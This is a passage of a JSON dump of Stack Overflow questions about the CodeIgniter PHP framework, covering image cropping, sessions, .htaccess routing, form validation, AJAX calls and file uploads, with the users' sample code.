X1,Y1,X2,Y2,X3,Y3,X4,Y4 i want to crop the image depending on that 4 points. i checked the image manipulation class. the crop function seems to be very strange. any help please ?</p>\n"},{"tags":["php","javascript","codeigniter","image-manipulation","gd"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":938,"score":0,"question_id":3551315,"title":"image cropping with codeigniter","body":"<p>I am working with jcrop and codeigniter to allow users to crop images that they upload, I want to the image t crop to a size of 90x60 but what ever I try nothing seems to work, my current code looks like this, </p>\n\n<p><strong>CONTROLLER</strong></p>\n\n<pre><code>function save_crop() {\n        $this-&gt;load-&gt;library('image_lib');\n\n        $config['image_library'] = 'gd2';\n        //$config['library_path'] = '/usr/X11R6/bin/';\n        $config['source_image'] = './media/images/uploads/company_uploads/' . $this-&gt;input-&gt;post('image_name');\n        //$config['new_image'] = './media/images/uploads/company_uploads/cropped' . $this-&gt;input-&gt;post('image_name').'_'.time();\n        //die($config['source_image']);\n        $config['x_axis'] = $this-&gt;input-&gt;post('x');\n        $config['y_axis'] = $this-&gt;input-&gt;post('y');\n        $config['width'] = $this-&gt;input-&gt;post('w');\n        $config['height'] = $this-&gt;input-&gt;post('h');\n        $config['maintain_ration'] = TRUE;\n        $config['dynamic_output'] = TRUE;\n        $this-&gt;image_lib-&gt;initialize($config);\n\n        if(!$this-&gt;image_lib-&gt;crop()) {\n            echo $this-&gt;image_lib-&gt;display_errors();\n        } else {\n            echo \"Success\";\n        }\n    }\n</code></pre>\n\n<p><strong>JAVASCRIPT</strong></p>\n\n<pre><code>$('#jcrop_target').Jcrop({\n        onChange: showPreview,\n        onSelect: showCoords,\n        aspectRatio: 1,\n        addClass: 'custom',\n        maxSize: [90,60]\n    });\n\n    function showPreview(coords)\n    {\n        var rx = 100 / coords.w;\n        var ry = 100 / coords.h;\n\n        $('#preview').css({\n            width: Math.round(rx * 500) + 'px',\n            height: Math.round(ry * 370) + 'px',\n            marginLeft: '-' + Math.round(rx * coords.x) + 'px',\n            marginTop: '-' + Math.round(ry * coords.y) + 'px'\n        });\n    };\n\n    function showCoords(c)\n    {\n        $('#x').val(c.x);\n        $('#y').val(c.y);\n        $('#x2').val(c.x2);\n        $('#y2').val(c.y2);\n        $('#w').val(c.w);\n        $('#h').val(c.h);\n    };\n</code></pre>\n\n<p><strong>HTML</strong></p>\n\n<pre><code>&lt;?php if(isset($upload_data)) :?&gt;\n            &lt;?php if($upload_data['image_width'] &gt; 90 || $upload_data['image_height'] &gt; 60) : ?&gt;\n            &lt;p&gt;Your image is a little large&lt;/p&gt;\n            &lt;form action=\"&lt;?php echo base_url();?&gt;employer/save_crop\" method=\"post\"&gt;\n            &lt;div id=\"uploaded_image\"&gt;\n                &lt;img src=\"&lt;?php echo base_url();?&gt;media/images/uploads/company_uploads/&lt;?php echo $upload_data['file_name'];?&gt;\" id=\"jcrop_target\"/&gt;\n            &lt;/div&gt;\n                &lt;div id=\"uploaded_preview\"&gt;\n                &lt;img src=\"&lt;?php echo base_url();?&gt;media/images/uploads/company_uploads/&lt;?php echo $upload_data['file_name'];?&gt;\" id=\"preview\"/&gt;\n                &lt;/div&gt;\n                &lt;input type=\"hidden\" name=\"x\" id=\"x\" /&gt;\n                &lt;input type=\"hidden\" name=\"y\" id=\"y\" /&gt;\n                &lt;input type=\"hidden\" name=\"x2\" id=\"x2\" /&gt;\n                &lt;input type=\"hidden\" name=\"y2\" id=\"y2\" /&gt;\n                &lt;input type=\"text\" name=\"w\" id=\"w\" /&gt;\n                &lt;input type=\"text\" name=\"h\" id=\"h\" /&gt;\n                &lt;input type=\"hidden\" name=\"image_name\" value=\"&lt;?php echo $upload_data['file_name'];?&gt;\"/&gt;\n                &lt;input type=\"submit\" name=\"crop_image\" value=\"Crop\" /&gt;\n            &lt;/form&gt;\n            &lt;?php endif; ?&gt;\n        &lt;?php endif; ?&gt;\n</code></pre>\n"},{"tags":["php","codeigniter","login"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1404,"score":0,"question_id":4511111,"title":"Codeigniter create session and redirect not working in IE","body":"<p>I'm using codeigniter and have a simple user login setup.  User submits their credentials, checks with the DB if they are valid, if they are the model passes the controller a session ID and is redirected to the user page.  If the data is not correct the user is redirected to the login page with an error message.  Nothing fancy here.  The problems is it doesnt work in IE.  I'm not sure if its because of the redirect or the session creation.  Works fine in all browsers except IE.  I tested ie 8 with windows 7 on parallels and worked fine.  The weird thing is that it doesnt work with on a pc with windows 7 IE 8.  Can someone tell me why the login page just keeps getting refreshed every time the user goes to login?  I was told to try and add this code :</p>\n\n<p><code>&lt;head&gt; \n&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt; \n&lt;meta http-equiv=\"pragma\" content=\"no-cache\" /&gt; \n&lt;meta http-equiv=\"Expires\" content=\"-1\" /&gt; \n&lt;meta http-equiv=\"CACHE-CONTROL\" content=\"NO-CACHE\" /&gt; \n&lt;/head&gt;</code> </p>\n\n<p>Which did nothing.  I also changed the session handler from ci_sessions to cisessions which didnt help either (i saw this on another forum).  Can ANYONE help?!</p>\n"},{"tags":[".htaccess","codeigniter","paypal","ipn"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":43,"score":1,"question_id":12577077,"title":"Codeigniter .htaccess not ignoring directories","body":"<p>I have a website built on codeigniter and am trying to get the PP IPN working with it.  I have looked at a few CI specific libraries, but want to have a stand alone IPN file.</p>\n\n<p>Basically, I have CI installed in the website root and I have another directory 'pp', also in the root.</p>\n\n<p>I'm trying to test the IPN using Paypal's sandbox, but it's returning a 404, I also can't access the file directly.</p>\n\n<p>Here is my .htaccess file:</p>\n\n<pre><code>XSendFile on\nOptions -Indexes\nOptions +FollowSymlinks\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\n\n### Canonicalize codeigniter URLs\nRewriteRule ^(index(/index)?|index(\\.php)?)/?$ / [L,R=301]\nRewriteRule ^(.*)/index/?$ $1 [L,R=301]\n\n# Removes trailing slashes (prevents SEO duplicate content issues)\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.+)/$ $1 [L,R=301]\n\nRewriteCond %{HTTP_HOST} !^(www) [NC]\nRewriteRule ^(.*)$ http://www.mysite.net/$1 [L,R=301]\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond $1 !^(index\\.php|pp|robots\\.txt)\nRewriteRule ^(.*)$ index.php/$1 [L]\n&lt;/IfModule&gt;\n\n&lt;IfModule !mod_rewrite.c&gt;\n# Without mod_rewrite, route 404's to the front controller\nErrorDocument 404 /index.php\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Here's hoping it's something really obvious!</p>\n\n<p>Thanks,</p>\n\n<p>Ryan</p>\n"},{"tags":["php","javascript","codeigniter","ckeditor","wkhtmltopdf"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":136,"score":0,"question_id":12570108,"title":"Using ckeditor to edit many divs on a page, then save the HTML to file","body":"<p>Hey guys I'm implementing a page that has about 9 separate divs on it that I want each to be separately editable using ckeditor.  The page is being dynamically generated through php with codeigniter but I want a user to be able to make changes to the HTML before finalizing it. I have currently implemented ckeditor to edit divs as demonstrated here: <a href=\"http://nightly.ckeditor.com/7614/_samples/divreplace.html\" rel=\"nofollow\">http://nightly.ckeditor.com/7614/_samples/divreplace.html</a></p>\n\n<p>However after the user is done I want to be able to save the HTML on my server since I will be converting the page to a PDF using wkhtmltopdf.  As you can see on the example once you click any of the divs it opens a new editor.  I need a way to submit the changes when the user is done editing the page and because I am trying to pdf the resulting HTML i cannot include a button or similar element.  I am also worried that since in this example you can't hide all the editors you can only open a new one that the PDF will show the ckeditor box.  I was thinking that I could just grab the document on a javascript event and send it via ajax request to a php function that would save it to a file and then PDF the file but I am unsure how to trigger the html submit event or replace the remaining edit box.  Any suggestions?</p>\n"},{"tags":["php","jquery","mysql","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":327,"score":2,"question_id":12526863,"title":"How to insert values from JQuery datepicker to MySQL date datatype using Codeigniter?","body":"<p>i can't insert the values from my JQuery Datepicker to my MySQL database with Date datatype. how will i convert string to date datatype? im using Codeigniter with MVC. here's my code:</p>\n\n<p>javascript</p>\n\n<pre><code>&lt;script&gt;\n$(function() {\n    $( \"#datepicker\" ).datepicker({\n        showOn: \"button\",\n        buttonImage: \"images/icons/calendar_24.png\",\n        buttonImageOnly: true,\n        onSelect: function(dateText, inst){\n            $(\"input[name='dob']\").val(dateText);\n        }\n    });\n\n});\n&lt;/script&gt;\n</code></pre>\n\n<p>controller</p>\n\n<pre><code>function create()\n{\n    $data = array(\n        'FirstName' =&gt; $this-&gt;input-&gt;post('fname'),\n        'DateofBirth' =&gt; $this-&gt;input-&gt;post('dob')\n    );\n\n    $this-&gt;site_model-&gt;add_record($data);\n    $this-&gt;index();\n}\n</code></pre>\n\n<p>view</p>\n\n<pre><code>&lt;?php echo form_open('site/create');?&gt;\n&lt;p&gt;\n    &lt;label for=\"fname\"&gt;First Name:&lt;/label&gt;\n    &lt;input type=\"text\" name=\"fname\" /&gt;\n&lt;/p&gt;\n\n&lt;p&gt;\n    &lt;input type=\"text\" name='dob' id=\"datepicker\" /&gt;\n&lt;/p&gt;\n</code></pre>\n\n<p>thanks guys!\ni read some solution in google\nand i did this:</p>\n\n<p>controller:</p>\n\n<pre><code>function create()\n{\n    $date = $this-&gt;input-&gt;post('dob');\n\n    $data = array(\n        'FirstName' =&gt; $this-&gt;input-&gt;post('fname'),\n        'DateofBirth' =&gt; date('Y-m-d', strtotime($date))\n    );\n\n    $this-&gt;site_model-&gt;add_record($data);\n    $this-&gt;index();\n}\n</code></pre>\n\n<p>and this solved my problem! :)</p>\n"},{"tags":["php","forms","mvc","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12575617,"title":"Form Validate not running","body":"<p>I have read all other questions, including everything on google. There's no visible difference between this one and the same method I'm using for register.\nIt's a very basic concept that doesn't want to work.</p>\n\n<p>Doing a dump of $_POST shows the correct empty string, so something else is going wrong somewhere.</p>\n\n<p><strong>Controller</strong></p>\n\n<pre><code>public function details(){\n    $this-&gt;load-&gt;library('form_validation');\n    //$this-&gt;form_validation-&gt;set_message('current-password', 'Incorrect password');\n    $this-&gt;form_validation-&gt;set_rules('current-password', 'Password', 'required');\n    $this-&gt;load-&gt;view('details', $data);\n}\n</code></pre>\n\n<p><strong>View</strong></p>\n\n<pre><code>&lt;?php echo validation_errors(); ?&gt;\n&lt;?php echo form_open('user/details'); ?&gt;\n    &lt;input type=\"password\" name=\"current-password\" id=\"current-password\" value=\"\"/&gt;\n    &lt;input type=\"submit\" class=\"submit-save\" value=\"save\"/&gt;\n&lt;/form&gt;\n</code></pre>\n"},{"tags":["php","codeigniter","session"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":91,"score":-2,"question_id":12575578,"title":"Assign multidimensional array to session in php","body":"<p>Hey guys i have a problem in storing multi dimensional array in my session. My error is it only stores the last value of my array. I mean the last array inside my multidimensional. How can i retrieve all my arrays inside my multidimensional array? Here's my sample code:</p>\n\n<pre><code> $transact = array($product_id =&gt; array(\n                    'product_name' =&gt; $product_name,\n                    'product_desc' =&gt; $product_desc, \n                    'product_price' =&gt; $product_price, \n                    'product_qty' =&gt; $product_qty, \n                    'product_amount' =&gt; $product_amount, \n                    'product_code' =&gt; $product_code\n                    )\n                  );\n\n // my session process\n foreach($transact as $value){\n   $serialize = serialize($value);\n   $this-&gt;session-&gt;set_userdata('product_list',$serialize);    }\n\n// my data to next page  \n$unserialize = unserialize($this-&gt;session-&gt;userdata('product_list'));\nprint_r($unserialize);\n\n//sample output   Array (\n[product_name] =&gt; HP IPAQ RW6828\n[product_desc] =&gt; Cellphone\n[product_price] =&gt; 1500.00\n[product_qty] =&gt; 1\n[product_amount] =&gt; 1500\n[product_code] =&gt; HP I2012-08386 )\n</code></pre>\n\n<p>It does not display the other selected product. Only the last product.Please help me guys    im in a middle of a project that i need to finish as soon as possible.</p>\n\n<p>By the way im using codeigniter framework.</p>\n"},{"tags":["php","regex","codeigniter","url-routing"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12574735,"title":"why doesn't this regular expression get recognized by codeigniter's router","body":"<p>I have this route:</p>\n\n<pre><code>$route[\"((parameter|type|something)-([0-9]+)\\/)+\"] = 'somecontroller';\n</code></pre>\n\n<p>so when i test the url with this:</p>\n\n<pre><code>www.somewebsite.com/parameter-1/\n</code></pre>\n\n<p>codeigniter returns with a page not found error.  But I tested the regular expression here:</p>\n\n<p><a href=\"http://rubular.com/\" rel=\"nofollow\">http://rubular.com/</a></p>\n\n<p>and it seems to work perfectly fine.</p>\n\n<p>Edit:  I have also tried putting the leading/trailing /'s:</p>\n\n<pre><code>$route[\"/((parameter|type|something)-([0-9]+)\\/)+/\"] = 'somecontroller';\n</code></pre>\n\n<p>Edit:  Ok thanks to Omega(user), it's because the slash character(/) has special precedence or effect in the codeigniter's route parsing engine.  So if it's part of the regular expression you have express how many times it can appear, not sure why, so you can follow it by these operators {}  or ?  or * or +, or any other operator that deals with how many times the preceding expression appears.  So the above route, with the ? operator works:</p>\n\n<pre><code>$route[\"/((parameter|type|something)-([0-9]+)\\/)+/?\"] = 'somecontroller';\n</code></pre>\n\n<p>It's clearly a codeigniter specific issue.</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":2,"view_count":47,"score":0,"question_id":12567172,"title":"How to separate MVC folders out of application directory in codeigniter?","body":"<p>I'm very new at codeigniter.  I was just wondering if there is anyway that I can separate the <strong>controllers</strong>, <strong>models</strong>, and <strong>views</strong> folders out of the application folder or put them in a sub-directory.  </p>\n\n<p>I understand it's not crucial but it would be easier to find when it's <strong>just these three</strong> folders in a separate folder.</p>\n\n<p>For example the structure could be as a sub-directory: <br>\n-> application <br>\n&nbsp;&nbsp;&nbsp;-> <b>MVC</b> <br>\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-> controllers <br> \n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-> models <br>\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-> views <br>\n&nbsp;&nbsp;&nbsp;-> ... <br></p>\n\n<p>My question is if there is a way, what configuration would I have to change in order to make the move?</p>\n\n<p>Thank you!</p>\n"},{"tags":["php","class","codeigniter","logging"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":12572068,"title":"codeigniter alter Common.php functions","body":"<p>I'm trying to customize the logging functionality of codeigniter.  I found this forum thread which describes exactly what I need:\n<a href=\"http://codeigniter.com/forums/viewthread/139997/\" rel=\"nofollow\">http://codeigniter.com/forums/viewthread/139997/</a>\nBut I want to do that without altering core files/classes.</p>\n\n<p>I\"m trying to alter the log_message function.  I've already extended the CI_Log class and that is working well, but now I'm trying to alter log_message() which resides in system/core/Common.php.  It isn't actually a class so I can't extend it, it just appears to be a collection of useful functions.  I tried redeclaring log_message() and placing it in application/core/Common.php, but that doesn't appear to work.  Any ideas how I can go about this?</p>\n"},{"tags":["php","javascript","ajax","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12570967,"title":"How to intercept FORM results","body":"<p>I need to remotely submit/process a form on an external website and get the results back on my site. The user can NOT be aware of this interaction.</p>\n\n<p>I am able to get the data using HTML PHP/ Simple_Html_Dom</p>\n\n<pre><code>&lt;?php\nrequire \"DOM/simple_html_dom.php\";\n\n$html = file_get_html('website.com/pricing');\nforeach ($html-&gt;find('div[id=Price]') as $result)\n{\n    echo $result-&gt;innertext;\n}\n\n?&gt;\n</code></pre>\n\n<p>It is returning, PRICE as N/A.  I need to be able to pass the values of the fields. I was hoping to pass them as hidden values such as <code>&lt;input type=\"hidden\" name=\"QTY\" value=\"100\" /&gt;</code></p>\n\n<p>What is the proper syntax and/or how do I accomplish this task?</p>\n\n<p>I tried: </p>\n\n<pre><code>$html-&gt;load('&lt;html&gt;&lt;body\n&lt;form action=\"website.com/...\" method=\"post\" name=\"Pricing\" &gt; \n#all hidden fields &amp; values\n&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;')\n</code></pre>\n\n<p>Any ideas? Thanks for the help. Ideally I am trying to recreate the form on my page and fetch the results of the query in real-time using AJAX.</p>\n\n<p>--MORE DATA--\nThis page is using sessions: (How does this affect POST?)</p>\n\n<pre><code>{\n\"headers\": {\n\"Date\": \"Mon, 24 Sep 2012 19:23:58 GMT\",\n\"Server\": \"Apache\",\n\"Set-Cookie\": \"JSESSIONID=01987F6C188624B08885FE26644300DA.worker2; Path=/g\",\n\"Cache-Control\": \"no-cache\",\n\"Pragma\": \"no-cache\",\n\"P3P\": \"CP=\\\"IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT\\\"\",\n\"Vary\": \"Accept-Encoding\",\n\"Connection\": \"close\",\n\"Transfer-Encoding\": \"chunked\",\n\"Content-Type\": \"text/html;charset=UTF-8\"\n},\n</code></pre>\n"},{"tags":["php","database","codeigniter","codeigniter-2","codeigniter-datamapper"],"answer_count":4,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":1250,"score":4,"question_id":5176688,"title":"class name collision when using codeigniter 2.0 with Datamapper?","body":"<p>I am using CI2.0 with PHP 5.3</p>\n\n<p>I just started to use “Datamapper ORM” and it is excellent!! however their is a one big problem regarding the classes’ names</p>\n\n<p>I have a database table called “users” so my dm model is “user” and also I have a controller with the same name “user”?</p>\n\n<p>so using the “user” model within the “user” controller is imposible!!</p>\n\n<p>what is the best way to solve this problem?</p>\n\n<p>Many Thanks</p>\n\n<p>best regards</p>\n"},{"tags":["forms","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":12562700,"title":"form not being printed, not showing in codeigniter, how can i make it show?","body":"<p>Ive created a page where i need to send a form, nothing special, everything should be simple.. and might sound bad but it was working, now i tried to submit it and was no result, checking the printed code (u know, the code that is downloaded in the browser) i see my form is missing, i am trying to figure out whats wrong, but nothing, ichecked for unclosed tags but the problem continues, any idea how to solve this? anyone had the same problem? only the tags of form are not showing. thanks</p>\n\n<p>my code:</p>\n\n<pre><code>echo form_open('form/form/do_upload');\necho form_fieldset('Login Form');\ninputs here (they are visible);\necho form_submit('login', 'Login');\necho form_fieldset_close();\necho form_close();\n</code></pre>\n"},{"tags":["php","codeigniter","datetime","helper"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":5,"view_count":72,"score":-5,"question_id":12379273,"title":"Days in the month in CodeIgniter","body":"<p>I'm looking for a function I have seen some time ago in the CodeIgniter, it was a helper or something and what the function has to do is to calculate the amount of days in the specified month. </p>\n\n<p>I was looking for this function in their user guide but could not find anything... It has been removed or its just me?</p>\n"},{"tags":["php","jquery","ajax","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":58,"score":4,"question_id":12571406,"title":"I'm obviously making a stupid beginners Codeigniter error - I can't hit a method in a class - why?","body":"<p>This is my first CI project so forgive me.</p>\n\n<p>I simply cant hit a method with an AJAX call. It keeps coming up as a 404 in Web Inspector.</p>\n\n<p>I have a controller called \"home.php\".  It's working. I can land on my home page.</p>\n\n<p>Then I have this AJAX call firing on a hover event</p>\n\n<pre><code>function showDataWindow(){\n    // i might switch this to data attr, but for now item IDs are contained in class\n    var thisClass = $(this).attr('class');\n    var thisIDpos = thisClass.indexOf(\"id-\")+3;\n    var thisID = thisClass.substr(thisIDpos, 3);\n    alert(thisID); // alerting correctly\n    $.post('getMoreInfo', { ID: thisID},\n        function(data) {\n             .. act on data\n</code></pre>\n\n<p>I simply can find the method I am calling - getMoreInfo.  Always 404.</p>\n\n<p>I have a home.php class in my controllers and its set as my default, and it works because I am landing on my home page and getting the index.  But in that home controller is also my getMoreInfo function...</p>\n\n<pre><code>public function getMoreInfo()\n{\n    $ID = $_POST['ID'];\n    $this-&gt;load-&gt;model('Artist_model');\n    $assocReturned = $this-&gt;Artist_model-&gt;get_more_info($ID);\n    echo json_encode($assocReturned);\n} \n</code></pre>\n\n<p>And I feel like there is a tiny MC Hammer guarding that function.  \"You can't touch this\".  He mocks me in his little parachute pants and minuscule fade.</p>\n\n<p>I think it must be how I am doing my URI in the Jquery AJAX post?  I have index re-writing in my htaccess (which I am kind of foggy on exactly)</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ /index.php?$1 [L]\n</code></pre>\n\n<p>But I have tried just about every URI permutation in that AJAX call </p>\n\n<pre><code>www.mySite.com/index.php/home/getMoreInfo\nindex.php/home/getMoreInfo\nindex.php/getMoreInfo\n/home/getMoreInfo\nhome/getMoreInfo\n/getMoreInfo\ngetMoreInfo\n</code></pre>\n\n<p>!</p>\n\n<p>And none have worked.  So what silly mistake I am making?</p>\n"},{"tags":["php","codeigniter","file-upload"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":78,"score":0,"question_id":12571119,"title":"Codeigniter temporary store files","body":"<p>I'm uploading my files to a web storage service so I don't need to store them in my server. I want to store them in a temporary folder but also use Codeigniter's uploading class for its security validation and filename encryption. </p>\n\n<p>I tried this in the config</p>\n\n<pre><code>$config['upload_path'] = $_FILES['userfile']['tmp_name'];\n\n$this-&gt;load-&gt;library('upload', $config);\n\n$this-&gt;upload-&gt;do_upload();\n</code></pre>\n\n<p>but I get the wrong upload path error. Is it possible to upload temporary files without creating my own uploading class?</p>\n"},{"tags":["codeigniter","hyperlink","download"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12570463,"title":"How do I link to a pdf using CodeIgniter?","body":"<p>this is such a simple task, yet I can't seem to get it to load a pdf. </p>\n\n<p>I have a simple link on my view that links to a pdf stored in a downloads folder.</p>\n\n<p>Is there something I'm missing about doing this in CodeIgniter?</p>\n\n<pre><code>&lt;div class=\"node_title_grant\"&gt;\n  &lt;a href=\"&lt;?php echo base_url();?&gt;index.php/downloads/grant.pdf\" target=\"_blank\"&gt;\n    Grant\n  &lt;/a&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p>then I have grant.pdf stored in a downloads folder in my application folder.</p>\n\n<p>thanks in advance </p>\n"},{"tags":["jquery","ajax","codeigniter","success"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":7491,"score":1,"question_id":2584029,"title":"jQuery Ajax success function returns null?","body":"<p>I use the following the jquery statements to call my php controller function, it gets called but my result is not returned to my success function....</p>\n\n<pre><code>&lt;html&gt;\n    &lt;head&gt;\n        &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"http://localhost/codeigniter_cup_myth/stylesheets/style.css\" /&gt;\n        &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"http://localhost/codeigniter_cup_myth/stylesheets/calendar.css\" /&gt;\n        &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"http://localhost/codeigniter_cup_myth/stylesheets/date_picker.css\" /&gt;\n        &lt;script type=\"text/javascript\" src=\"http://localhost/codeigniter_cup_myth/javascript/jquery1.4.2.js\"&gt;&lt;/script&gt;\n        &lt;script type=\"text/javascript\" src=\"http://localhost/codeigniter_cup_myth/javascript/jquery.pagination.js\"&gt;&lt;/script&gt;\n        &lt;script type=\"text/javascript\"&gt;\n            $(document).ready(function() {\n                getRecordspage();\n            });\n\n            function getRecordspage() {\n                $.ajax({\n                    type: \"POST\",\n                    url:\"http://localhost/codeigniter_cup_myth/index.php/adminController/mainAccount\",\n                    data: \"{}\",\n                    contentType: \"application/json; charset=utf-8\",\n                    global:false,\n                    async: true,\n                    dataType: \"json\",\n                    success: function(result) {\n                        alert(result);\n                    }\n                });\n            }\n        &lt;/script&gt;\n    &lt;/head&gt;\n    &lt;body&gt;\n        &lt;table  id=\"chkbox\" cellpadding=\"0\" cellspacing=\"2\" width=\"100%\" class=\"table_Style_Border\"&gt;\n            &lt;tr&gt;\n                &lt;td class=\"grid_header\" align=\"center\"&gt;S.No&lt;/td&gt;\n                &lt;td class=\"grid_header\" align=\"center\"&gt;Account Name&lt;/td&gt;\n                &lt;td class=\"grid_header\" align=\"center\"&gt;Account Acronym&lt;/td&gt;\n                &lt;td class=\"grid_header\" align=\"center\"&gt;Finance Year Start&lt;/td&gt;\n                &lt;td class=\"grid_header\" align=\"center\"&gt;Finance Year End&lt;/td&gt;\n                &lt;td class=\"grid_header\" align=\"center\"&gt;&amp;nbsp;&lt;/td&gt;\n            &lt;/tr&gt;\n            &lt;tr&gt; &lt;td colspan=\"5\"&gt; &lt;/td&gt;&lt;/tr&gt;\n        &lt;/table&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>My controller method,</p>\n\n<pre><code>function mainAccount()\n{\n    $_SESSION['menu'] = 'finance';\n    $data['account'] = $this-&gt;adminmodel-&gt;getaccountDetails();\n    if(empty($data['account']))\n    {\n        $data['comment'] = 'No record found !';\n    }\n    $json = json_encode($data);\n    return $json;\n}\n</code></pre>\n\n<p>I get the <code>alert(1);</code> in my success function but my <code>alert(result);</code> show <code>null</code>. How do I fix this problem?</p>\n\n<p>This was what I got when I gave <code>print_r($data);</code>:</p>\n\n<pre><code>Array ( [account] =&gt; Array ( [0] =&gt; Array ( [dAcc_id] =&gt; 1 [dAccountName] =&gt; Govt. College Of Technology [dAccountAcronym] =&gt; GCT [dFromDate] =&gt; 2010-04-02 [dToDate] =&gt; 2011-05-03 ) [1] =&gt; Array ( [dAcc_id] =&gt; 3 [dAccountName] =&gt; sample4 [dAccountAcronym] =&gt; smp_4 [dFromDate] =&gt; 2010-03-17 [dToDate] =&gt; 2011-03-03 ) [2] =&gt; Array ( [dAcc_id] =&gt; 4 [dAccountName] =&gt; sample3 [dAccountAcronym] =&gt; smp_3 [dFromDate] =&gt; 2010-03-16 [dToDate] =&gt; 2011-03-17 ) [3] =&gt; Array ( [dAcc_id] =&gt; 5 [dAccountName] =&gt; sample5 [dAccountAcronym] =&gt; smp_5 [dFromDate] =&gt; 2010-03-12 [dToDate] =&gt; 2011-03-03 ) [4] =&gt; Array ( [dAcc_id] =&gt; 6 [dAccountName] =&gt; sample2 [dAccountAcronym] =&gt; smp2 [dFromDate] =&gt; 2010-03-01 [dToDate] =&gt; 2011-03-16 ) [5] =&gt; Array ( [dAcc_id] =&gt; 7 [dAccountName] =&gt; sample1 [dAccountAcronym] =&gt; smp_1 [dFromDate] =&gt; 2010-03-11 [dToDate] =&gt; 2011-03-03 ) [6] =&gt; Array ( [dAcc_id] =&gt; 8 [dAccountName] =&gt; ss [dAccountAcronym] =&gt; ss [dFromDate] =&gt; 2010-04-04 [dToDate] =&gt; 2010-04-06 ) ) )\n</code></pre>\n\n<p>When I did <code>print_r(json_encode($data['account']));</code>, I got this:</p>\n\n<pre><code>[{\"dAcc_id\":\"1\",\"dAccountName\":\"Govt. College Of Technology\",\"dAccountAcronym\":\"GCT\",\"dFromDate\":\"2010-04-02\",\"dToDate\":\"2011-05-03\"},{\"dAcc_id\":\"3\",\"dAccountName\":\"sample4\",\"dAccountAcronym\":\"smp_4\",\"dFromDate\":\"2010-03-17\",\"dToDate\":\"2011-03-03\"},{\"dAcc_id\":\"4\",\"dAccountName\":\"sample3\",\"dAccountAcronym\":\"smp_3\",\"dFromDate\":\"2010-03-16\",\"dToDate\":\"2011-03-17\"},{\"dAcc_id\":\"5\",\"dAccountName\":\"sample5\",\"dAccountAcronym\":\"smp_5\",\"dFromDate\":\"2010-03-12\",\"dToDate\":\"2011-03-03\"},{\"dAcc_id\":\"6\",\"dAccountName\":\"sample2\",\"dAccountAcronym\":\"smp2\",\"dFromDate\":\"2010-03-01\",\"dToDate\":\"2011-03-16\"},{\"dAcc_id\":\"7\",\"dAccountName\":\"sample1\",\"dAccountAcronym\":\"smp_1\",\"dFromDate\":\"2010-03-11\",\"dToDate\":\"2011-03-03\"},{\"dAcc_id\":\"8\",\"dAccountName\":\"ss\",\"dAccountAcronym\":\"ss\",\"dFromDate\":\"2010-04-04\",\"dToDate\":\"2010-04-06\"}]\n</code></pre>\n"},{"tags":["javascript","ajax","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12569721,"title":"Ajax call not succeeding after function call","body":"<p>I am attempting to load dynamic data based on the specific URI segment thats on the page.</p>\n\n<p>Heres my Javascript:</p>\n\n<pre><code>$(document).ready(function() {\n    $(function() {\n        load_custom_topics();\n    });\n\n    $('#topics_form').submit(function() {\n        var topic = document.getElementById('topics_filter').value\n        $.ajax({\n            type: \"POST\",\n            url: 'ajax/update_session_topic',\n            dataType: 'json', \n            data: { topic: topic },\n                success: function(){\n                    load_custom_topics()\n                }\n        });\n        return false;\n    });\n\n    function load_custom_topics(){\n        $.ajax({\n        type: \"POST\",\n        url: 'ajax/load_custom_topics',\n        dataType: 'json',\n        data: {},\n                success: function (html) {\n                    $('div.topics_filter').html(html['content']);\n                    get_threads();\n                }\n        });\n    }\n\n    function get_threads(){\n        var page = document.getElementById('page').value\n        $.ajax({\n        type: \"POST\",\n        url: 'ajax/get_threads',\n        dataType: 'json',\n        data: {page: page},\n            success: function (html) {\n                